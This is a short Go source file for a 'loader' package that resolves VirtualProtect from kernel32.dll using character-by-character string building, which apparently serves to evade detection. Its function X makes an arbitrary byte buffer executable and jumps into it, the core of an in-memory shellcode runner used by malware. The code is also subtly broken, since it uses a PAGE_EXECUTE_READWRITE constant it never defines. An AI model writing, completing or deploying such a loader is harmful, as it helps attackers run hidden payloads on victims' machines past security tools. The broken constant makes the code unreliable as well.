package loader

import (
	"syscall"
	"unsafe"
)

var (
	proc42526789738d uintptr
)

const (
	PAGE_EXECUTE_READ = 0x20
)

func Init() error {
	modKernel32, err := syscall.LoadLibrary(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	}))
	if err != nil {
		return err
	}

	proc42526789738d, err = syscall.GetProcAddress(modKernel32, string([]byte{
		'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't',
	}))
	if err != nil {
		return err
	}

	return nil
}

func X(buf []byte) {
	var dwOldPerm uint32
	syscall.Syscall6(
		proc42526789738d,
		4,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&dwOldPerm)),
		0, 0,
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}
